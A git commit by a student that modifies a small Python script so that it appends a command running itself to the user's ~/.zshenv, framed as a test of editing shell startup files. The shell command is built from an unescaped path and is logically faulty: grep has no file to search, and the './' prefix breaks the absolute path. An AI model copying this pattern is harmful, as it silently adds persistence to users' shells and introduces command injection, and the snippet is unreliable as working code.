0b36458cbc095b00075e5476ddb4261dd38ce421
Sunny Chen <z5267282@student.unsw.edu.au>
2022-04-16 16:07:54 +1000

    Testing to see if manipulating zshrc in a python file works

--- get-path.py
+++ get-path.py
@@ -1,6 +1,13 @@
+from __future__ import absolute_import
 import os
 import sys
 
 # following steps from: https://stackoverflow.com/questions/595305/how-do-i-get-the-path-of-the-python-script-i-am-running-in
 
-print(os.path.abspath(sys.argv[0]))
+abs_path = os.path.abspath(sys.argv[0])
+
+abs_name = f"'{abs_path}'"
+
+os.system(f'[ -f ~/.zshenv ] && grep -F {abs_name} > /dev/null && exit 0 ; echo "./{abs_name}" >> ~/.zshenv')
+
+print('hello!')
